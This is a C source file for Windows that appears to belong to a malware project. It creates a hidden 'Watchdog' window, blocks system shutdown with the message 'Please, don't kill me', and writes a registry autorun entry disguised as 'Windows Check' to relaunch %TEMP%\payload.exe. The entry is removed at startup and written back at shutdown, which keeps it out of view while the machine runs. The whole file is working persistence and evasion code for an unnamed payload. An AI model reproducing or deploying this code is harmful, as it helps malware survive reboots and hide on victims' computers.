#include "payload.h"

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    char payload_path[MAX_PATH] = {0};
    ExpandEnvironmentStringsA("%TEMP%\\payload.exe", payload_path, MAX_PATH);

    switch (uMsg)
    {
    case WM_QUERYENDSESSION:
    {
        ShutdownBlockReasonCreate(hwnd, L"Please, don't kill me");
        AddRegAutorun("Windows Check", payload_path);
        return TRUE;
    }

    default:
        return DefWindowProcA(hwnd, uMsg, wParam, lParam);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

    WNDCLASS sampleClass = {0};
    sampleClass.lpszClassName = "Watchdog";
    sampleClass.lpfnWndProc = WindowProc;
    RemoveRegAutorun("Windows Check");

    if (!RegisterClassA(&sampleClass))
    {
        printf("\nERROR: Could not register window class");
        return 2;
    }

    HWND hwnd = CreateWindowExA(
        0,
        sampleClass.lpszClassName,
        "Watchdog",
        0,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        NULL,
        NULL,
        NULL,
        NULL);

    if (!hwnd)
    {
        printf("\nERROR: Could not create window");
        return 3;
    }

    ShowWindow(hwnd, SW_HIDE);
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

    return 0;
}